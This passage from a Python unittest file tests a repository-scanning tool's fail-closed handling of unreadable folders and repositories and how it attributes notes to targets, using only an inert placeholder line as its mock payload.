        for repo in targets[:2]:
            self.assertTrue(any(str(repo) in n and "link into SSH" in n for n in notes),
                            f"{repo.name} does not own its note: {notes}")

    def test_a_note_about_one_target_names_that_target(self):
        targets = self._two_repos_and_a_folder()
        notes = self._notes(targets)
        not_a_repo = [n for n in notes if "not a repository" in n]
        self.assertTrue(not_a_repo, "the note vanished")
        for n in not_a_repo:
            self.assertIn(str(targets[2]), n, "the note does not say which target it is about")

    def test_a_single_target_is_not_prefixed_with_its_own_name(self):
        targets = self._two_repos_and_a_folder()
        notes = self._notes([targets[2]])
        self.assertTrue(notes)
        for n in notes:
            # The note TEXT carries em-dashes of its own, so the property is "does not name the
            # target", not "has no dash" — the first version of this test asserted the latter.
            self.assertNotIn(str(targets[2]), n,
                             f"a lone target's note was needlessly attributed: {n}")


class TestAFolderThatCouldNotBeReadIsNotClean(unittest.TestCase):
    """An unreadable FILE has always been recorded and fails the target closed. A directory was
    skipped in silence, so a target could report clean with a whole subtree unread — the one thing
    the scanner must never do."""

    def setUp(self):
        import subprocess
        self.d = Path(tempfile.mkdtemp())
        subprocess.run(["git", "init", "-q", str(self.d)], check=True)
        (self.d / "ok.js").write_text("export const ok = 1;\n", encoding="utf-8")
        self.shut = self.d / "src"
        self.shut.mkdir()
        (self.shut / "bad.js").write_text("var _$_ab12 = 1;\n", encoding="utf-8")
        os.chmod(self.shut, 0o000)
        self.addCleanup(os.chmod, self.shut, 0o755)

    def test_it_does_not_report_clean(self):
        # Asserted on the target's own status row and the fail-closed line, not on the word
        # "clean" — that word appears in the host note and in the refusal itself.
        report = _report_of(self.d)
        self.assertIn("ERROR", report)
        self.assertIn("failing closed", _stderr_of(self.d))

    def test_it_names_the_folder_it_could_not_read(self):
        self.assertIn("src/", _report_of(self.d) + _stderr_of(self.d))

    def test_a_readable_tree_is_unaffected(self):
        os.chmod(self.shut, 0o755)
        # The payload inside is found, and nothing claims a folder went unread.
        self.assertIn("bad.js", _report_of(self.d))
        self.assertNotIn("src/: PermissionError", _report_of(self.d))


class TestDiscoveryDoesNotDropWhatItCannotEnter(unittest.TestCase):
    """Naming an unreadable repository directly stopped the run. Reaching the same one through a
    pattern left it out without a word, and the run could end clean."""

    def setUp(self):
        import subprocess
        self.base = Path(tempfile.mkdtemp())
        for name in ("repo-open", "repo-shut"):
            r = self.base / name
            subprocess.run(["git", "init", "-q", str(r)], check=True)
            (r / "a.js").write_text("export const ok = 1;\n", encoding="utf-8")
        self.shut = self.base / "repo-shut"
        os.chmod(self.shut, 0o000)
        self.addCleanup(os.chmod, self.shut, 0o755)

    def test_a_pattern_answers_the_same_way_as_naming_it(self):
        direct = _report_of(self.shut) + _stderr_of(self.shut)
        pattern = _report_of(Path(str(self.base) + "/repo-*"))
        pattern += _stderr_of(Path(str(self.base) + "/repo-*"))
        self.assertIn("repo-shut", direct)
        self.assertIn("repo-shut", pattern,
                      "the pattern dropped a repository it matched but could not read")


if __name__ == "__main__":
    unittest.main()
